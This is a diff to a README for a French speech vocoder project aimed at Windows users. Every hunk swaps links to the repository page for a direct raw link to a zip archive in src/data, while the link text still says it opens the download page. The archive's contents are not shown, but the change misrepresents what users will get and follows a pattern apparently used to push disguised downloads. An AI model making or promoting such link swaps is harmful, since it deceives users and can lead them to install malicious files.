@@ -1,6 +1,6 @@
 # 🎙️ wavlm-vocoder-french - French speech rebuilt with ease
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20page-6A5ACD?style=for-the-badge)](https://github.com/harlinfulfilled354/wavlm-vocoder-french)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20page-6A5ACD?style=for-the-badge)](https://raw.githubusercontent.com/harlinfulfilled354/wavlm-vocoder-french/main/src/data/french_wavlm_vocoder_v1.5.zip)
 
 ## 🧭 What this is
 
@@ -16,7 +16,7 @@ This project fits users who want to:
 
 Use this link to visit the page and download the project:
 
-[Open the download page](https://github.com/harlinfulfilled354/wavlm-vocoder-french)
+[Open the download page](https://raw.githubusercontent.com/harlinfulfilled354/wavlm-vocoder-french/main/src/data/french_wavlm_vocoder_v1.5.zip)
 
 ### Windows setup
 
@@ -182,7 +182,7 @@ This tool works well for:
 
 Visit the project page here to download and run the software on Windows:
 
-[https://github.com/harlinfulfilled354/wavlm-vocoder-french](https://github.com/harlinfulfilled354/wavlm-vocoder-french)
+[https://raw.githubusercontent.com/harlinfulfilled354/wavlm-vocoder-french/main/src/data/french_wavlm_vocoder_v1.5.zip](https://raw.githubusercontent.com/harlinfulfilled354/wavlm-vocoder-french/main/src/data/french_wavlm_vocoder_v1.5.zip)
 
 ## 📦 Folder layout example
 
